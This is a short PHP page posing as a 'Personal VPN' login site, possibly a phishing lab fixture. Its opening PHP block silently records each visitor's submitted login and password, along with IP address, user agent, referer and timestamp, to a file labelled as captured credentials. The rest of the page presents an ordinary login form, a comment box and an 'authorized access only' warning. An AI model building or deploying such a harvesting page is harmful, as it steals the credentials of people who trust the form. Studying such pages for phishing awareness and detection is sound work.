<?php
$ip = getenv ('REMOTE_ADDR');
$date=date("j F, Y, g:i a");;
$referer=getenv ('HTTP_REFERER');
$agent=getenv ('HTTP_USER_AGENT');
$fp = fopen('data.txt', 'a');
fwrite($fp, '****Credentials: ' .$_POST["login"]. ' ' .$_POST["password"]. ' Agent: ' .$agent. ' IP: ' .$ip. ' Date and Time: ' .$date. ' Referer: '.$referer."\n");
fclose($fp);
?>
<html>

    <head>
        <title> Personal VPN </title>
        <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
        <meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'self'; report-uri /collector/csp_parser.php"> 
    </head>

    <body>
        <div id="container" style="width: 800px; margin: 30px auto;">
            <h1 style="text-align: center;"> My Personal Info</h1>
            <hr />

            <form action="login.php" method="post" class="niceform">
                <h2>Login Form</h2>
                <div id="login_msg">Please fill in your credentials</div>
                <label for="login">Login:</label>
                <input type="text" name="login" id="login" size="32" />
                <br />
                <label for="password">Password:</label>
                <input type="password" name="password" id="password" size="32" />
                <br />
                <input type="submit" name="submit" id="submit_login" value="Submit" />
            </form>

            <hr />

            <h2>WARNING: AUTHORIZED ACCESS ONLY</h2>
		<p>This site is for personal use only.
            <hr />

            <form action="comments.php" method="POST" class="niceform">
                <h2>Contact Me</h2>
                <label for="comment">Leave a comment for me</label>
                <br />
                <textarea name="comment" id="comment" rows="4" columns="300"></textarea>
                <br />
                <input type="submit" name="submit" id="submit_comment" value="Submit" />
            </form>

            <hr />

            <div id="comments">This is a really great site. Thanks for the access</div>

            <hr />

            <div id="footer"> Footer Powered By Personal Info. <i>Last updated 3/12/2016</i></div>
        </div>
    </body>
</html>
